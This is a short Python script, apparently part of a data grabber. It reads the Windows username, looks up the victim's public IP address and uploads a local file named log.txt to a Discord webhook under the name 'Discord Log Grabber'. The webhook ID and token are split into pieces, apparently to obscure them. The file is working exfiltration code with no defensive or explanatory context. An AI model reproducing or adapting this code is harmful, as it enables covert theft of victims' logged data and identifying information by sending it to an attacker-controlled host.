from urllib.request import Request, urlopen
import discord
import os

def GetIP():
    ip = "Can't get IP"
    try:
        ip = urlopen(Request("https://api.ipify.org?format=text")).read().decode().strip()
    except:
        pass
    return ip.replace("\"", "")

part1 = '931641374'
part2 = '2565081178'
key1 = '4I1dMtNQc4CimSxLhgbQGc02vfkuob1RLZAILONtqcR242INf4B'
key2 = '74wJLj1a-5T3pvfH2'
webhook = discord.Webhook.partial(part1 + part2, key1 + key2, adapter=discord.RequestsWebhookAdapter())

with open(file='log.txt', mode='rb') as f:
    discord_file = discord.File(f)

webhook.send('Username: ' + os.getenv("UserName") + '\n' + "ip: " + GetIP() + '\n', username='Discord Log Grabber', avatar_url='https://i.ibb.co/c3P5DbN/Gigachad.png', file=discord_file)
